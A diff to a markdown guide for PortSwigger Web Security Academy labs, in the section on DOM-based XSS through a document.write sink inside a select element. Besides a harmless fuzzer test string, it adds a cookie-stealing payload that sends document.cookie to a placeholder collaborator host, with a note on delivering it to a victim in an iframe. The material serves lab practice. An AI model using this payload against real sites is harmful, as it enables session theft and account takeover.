@@ -141,21 +141,27 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Doc Write Location search  
 
->The target is vulnerable to DOM-XSS in the stock check function. Source code reveal ```Document.write``` is the sink used with ```location.search``` allowing us to add new value to the JavaScript variable named **storeId**.  
+>The target is vulnerable to DOM-XSS in the stock check function. Source code reveal ```document.write``` is the sink used with ```location.search``` allowing us to add new value to the JavaScript variable named **storeId** inside a ```<select>``` statement.  
 
 ![DOM-XSS doc write inside select](images/dom-xss-doc-write-inside-select.png)  
 
+>Test to validate the identification of the injection into modified GET request.  
+
 ```html
-/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>
-```  
+/product?productId=1&storeId=fuzzer"></select>fuzzer
+```
 
 ![get-dom-xss.png](images/get-dom-xss.png)  
 
->Dom-based XSS request with inserted malicious code into the variable read by the target JavaScript.  
+>DOM XSS cookie stealer payload in a ```document.write``` sink using source ```location.search``` inside a ```<select>``` element. This can be send to victim via exploit server in ```<iframe>```.  
+
+```html
+"></select><script>document.location='https://COLLABORATOR.com/?domxss='+document.cookie</script>//
+```  
 
 ![dom-xss](images/dom-xss.png)  
 
-[PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
+[PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a <select> element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
 
 ### Dom Invader  
 
